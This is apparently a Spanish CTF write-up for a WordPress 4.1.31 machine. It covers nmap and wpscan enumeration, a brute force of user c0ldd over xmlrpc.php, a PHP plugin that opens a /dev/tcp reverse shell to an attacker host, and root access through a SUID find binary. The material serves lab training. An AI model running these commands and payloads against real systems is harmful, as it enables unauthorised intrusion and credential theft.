# <font color=red>[+]</font> Reconocimiento
```bash
sudo nmap -p- -sS -Pn -n -vvv $IP

PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
```

```bash
sudo nmap -p 80,4512 -sVC -Pn -n $IP

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Wordpress 4.1.31
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
4512/tcp open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
<snip>
```

Cuando realizamos una solicitud HTTP hacia la web `http://$IP`, se nos devuelve algo como esto:
```HTTP
curl -I http://$IP

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
X-Pingback: https://ejemplo.com/xmlrpc.php
```

## Wpscan

Para saber más información sobre el WordPress del sitio web podemos ejecutar la herramienta `wpscan`.
### 1. Enumeración

Lo primero es saber qué versiones y componentes tiene el sitio web.
- `WPScan`: Es la herramienta estándar de la industria. Nos dirá la versión de WordPress, los plugins instaldos y si tienen vulnerabilidades conocidas (CVEs).
  ```bash
  wpscan --url http://$IP --enumerate vp,vt,u
  ```
	- `vp`: Plugins vulnerables.
	- `vt`: Temas vulnerables.
	- `u`: Usuarios (para luego intentar fuerza bruta).
### 2. El archivo `xmlrpc.php`

Como ya vimos la cabecera `X-Pingback`, es casi seguro que el archivo `/xmlrpc.php` está activo. Esto puede usarse para:
- ***Enumeración de métodos:*** Podemos listar qué funciones están permitidas enviando un `POST` con un cuerpo *XML*.
- ***Ataque de fuerza bruta eficiente:*** A diferencia de un login normal, ***XML-RPC*** permite el método `system.multicall`, que puede probar cientos de combinaciones de *usuario/contraseña* en una sola petición HTTP, evadiendo bloqueos básicos.
### 3. Enumeración de usuarios vía API

Si WPScan no nos da usuarios, intentamos acceder directamente a la API REST de WordPress. Muchas veces está abierta por defecto:
- URL: `http://target-site.com/wp-json/wp/v2/users`. Ahí podríamos encontrar los **nombres de usuario** (slugs) necesarios para el siguiente paso.
### 4. Vulnerabilidades en Plugins y Temas

WordPress en sí suele ser seguro si está actualizado, pero los **plugins** son el eslabón débil. Busca en bases de datos como **Exploit-DB** o **Snyk** si encuentras versiones específicas de plugins.

- **LFI (Local File Inclusion):** Común en plugins que manejan archivos o imágenes. Podrías leer el archivo `wp-config.php`.
    
- **SQL Injection:** A veces presente en formularios de búsqueda o filtros personalizados.
    
- **RCE (Remote Code Execution):** El "santo grial". Algunos plugins de edición de imágenes o carga de archivos permiten subir shells en PHP.
### 5. El archivo `wp-config.php`

Si logras una ***LFI*** o **acceso al sistema de archivos**, nuestro objetivo prioritario es el `wp-config.php`. Contiene:

- Credenciales de la base de datos (DB_USER, DB_PASSWORD).
    
- Las "Salt Keys" de autenticación.
    

> [!tip] **Tip de CTF**
> A veces las credenciales de la base de datos son las mismas que las del usuario `root` o un usuario del sistema (SSH). **¡Pruébalas siempre!**

Primero actualizamos la base de datos de `wpscan`:
```bash
wpscan --update
```

Tras esto, probamos a enumerar la información del WordPress:
```
wpscan --url http://$IP --enumerate vp,vt,u  

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)

 | Found By: Headers (Passive Detection)

 | Confidence: 100%


[+] XML-RPC seems to be enabled: http://10.114.156.65/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

 | References:

 |  - http://codex.wordpress.org/XML-RPC_Pingback_API

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/


[+] WordPress readme found: http://10.114.156.65/readme.html

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%


[+] The external WP-Cron seems to be enabled: http://10.114.156.65/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 60%

 | References:

 |  - https://www.iplocation.net/defend-wordpress-from-ddos

 |  - https://github.com/wpscanteam/wpscan/issues/1299

  

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).

 | Found By: Rss Generator (Passive Detection)

 |  - http://10.114.156.65/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

 |  - http://10.114.156.65/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>


[+] WordPress theme in use: twentyfifteen

 | Location: http://10.114.156.65/wp-content/themes/twentyfifteen/

 | Last Updated: 2025-12-03T00:00:00.000Z

 | Readme: http://10.114.156.65/wp-content/themes/twentyfifteen/readme.txt

 | [!] The version is out of date, the latest version is 4.1

 | Style URL: http://10.114.156.65/wp-content/themes/twentyfifteen/style.css?ver=4.1.31

 | Style Name: Twenty Fifteen

 | Style URI: https://wordpress.org/themes/twentyfifteen

 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...

 | Author: the WordPress team

 | Author URI: https://wordpress.org/

 |

 | Found By: Css Style In Homepage (Passive Detection)

 |

 | Version: 1.0 (80% confidence)

 | Found By: Style (Passive Detection)

 |  - http://10.114.156.65/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'


[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.


[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)

 Checking Known Locations - Time: 00:00:06 <============================================================================================> (652 / 652) 100.00% Time: 00:00:06

[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.


[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================> (10 / 10) 100.00% Time: 00:00:00


[i] User(s) Identified:

[+] the cold in person

 | Found By: Rss Generator (Passive Detection)

[+] philip

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 | Confirmed By: Login Error Messages (Aggressive Detection)


[+] c0ldd

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 | Confirmed By: Login Error Messages (Aggressive Detection)


[+] hugo

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 | Confirmed By: Login Error Messages (Aggressive Detection)


[!] No WPScan API Token given, as a result vulnerability data has not been output.

[!] You can get a free API token with 25 daily requests by
```

Con esta enumeración vemos la versión de WordPress (***4.1.31***), los uusarios y el archivo `xmlrpc.php` activo.

Ya que tenemos tres nombres de usuario, probaremos a hacer un ataque de fuerza bruta aprovechando el archivo `xmlrpc.php`. XML-RPC es mucho más rápido para hacer fuerza bruta que el formulario de login normal porque permite probar múltiples contrseñas en una sola petición.

Podemos usar `wpscan` para esto, probando con una lista de contraseñas como `rockyou.txt`:
```bash
wpsacn --url http://$IP --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,philip,hugo

[SUCCESS] - c0ldd / 9876543210
```

Esto nos da la contraseña del usuario `c0ldd` que resulta ser el administrador del sitio web, por lo que obtenemos acceso a todas las funcionalidades de WordPress en el sitio web.

# <font color=red>[+]</font> Explotación para Acceso al Sistema

Para tratar de obtener acceso al sistema descargaremos un plugin malicioso que nos permite ejecutar una reverse shell hacia nuestra máquina atacante. Para ello:
1. ***Creamos el plugin***
   ```php
   <?php
   /**
   * Plugin Name: My CTF Shell
   * Version: 1.0
   * Author: PcxRoot
   */
   exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/PUERTO_KALI 0>&1'")
   ?>
   ```

2. ***Lo comprimimos en un archivo `.zip`***
   ```bash
   zip plugin_shell.zip shell.php
   ```

3. ***Lo subimos en Plugins > Add New > Upload Plugin***

4. ***Lo activamos***

Para que funcione debemos de poner a la espera a `nc` en nuestra máquina atacante por el puerto especificado:
```bash
nc -lvnp 4444
```

Y ya tendremos acceso al sistema como el usuario `www-data`.

---
# <font color=red>[+]</font> Post-Explotación

Cuando vemos los archivos con el ***Bit SUID activado*** nos muestra esto:
```bash
find / -perm /4000 2>/dev/null

/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
<snip>
```

Podemos apreciar que el mismo binario `find` tiene el ***Bit SUID activado***, por lo que vamos a ***[GTFOBins](https://gtfobins.org/gtfobins/find/#shell)*** y se nos muestra que podemos conseguir una Shell Bash con permisos de administrador con el comando:
```bash
find . -exec /bin/bash -p \; -quit

whoami
# root
```
